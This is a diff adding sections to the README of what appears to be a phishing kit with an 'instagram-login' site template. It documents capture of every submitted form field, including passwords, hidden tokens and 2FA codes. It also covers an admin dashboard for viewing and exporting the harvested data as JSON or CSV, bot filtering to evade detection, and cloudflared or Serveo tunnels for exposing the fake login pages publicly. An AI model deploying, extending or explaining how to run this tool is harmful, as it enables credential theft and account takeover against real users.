@@ -229,3 +229,61 @@ sites/instagram-login/
 └── img/
     └── logo.png
 ```
+
+## Form Data Capture
+The engine captures ALL form fields - any name, any type:
+```html
+<!-- ALL these fields are captured -->
+<form method="POST" action="/login">
+    <input name="email">                    ✓ Captured
+    <input name="password">                 ✓ Captured
+    <input name="custom_field">             ✓ Captured
+    <input name="random_name_123">          ✓ Captured
+    <input name="user[data][value]">        ✓ Captured
+    <input name="hidden_token">             ✓ Captured
+    <input name="2fa_code">                  ✓ Captured
+</form>
+```
+
+## Admin Panel
+Access your admin panel at the URL shown when starting:
+
+```text
+http://localhost:3000/admin-RANDOMTOKEN
+```
+
+**security features:**
+- Random password every run
+- Random admin URL path (16 chars hex)
+- Sessions expire after 1 hour
+- IP binding prevents session theft
+- 5 failed login attempts lockout
+- Bot/user-agent filtering
+
+**Dashboard Features:**
+- Real-time updates (3 second polling)
+- View all captured data
+- Filter by site, IP, or type
+- Search in captured data
+- Export as JSON (all fields)
+- Export as CSV (dynamic columns)
+- Clear all logs
+
+## Tunnel Options
+**Cloudflared**
+- Provides HTTPS URL: `https://random.trycloudflare.com`
+- Auto-installs if missing
+- More reliable for most users
+
+**Serveo.net**
+
+- Provides HTTPS URL: `https://random.serveousercontent.com`
+- Uses SSH tunneling
+- Good alternative if cloudflared fails
+
+## Export Options
+**JSON Export**
+- Includes ALL data including raw fields and metadata. Perfect for analysis.
+
+**CSV Export**
+- Dynamic columns for ALL fields found in captures. Opens in Excel/LibreOffice.
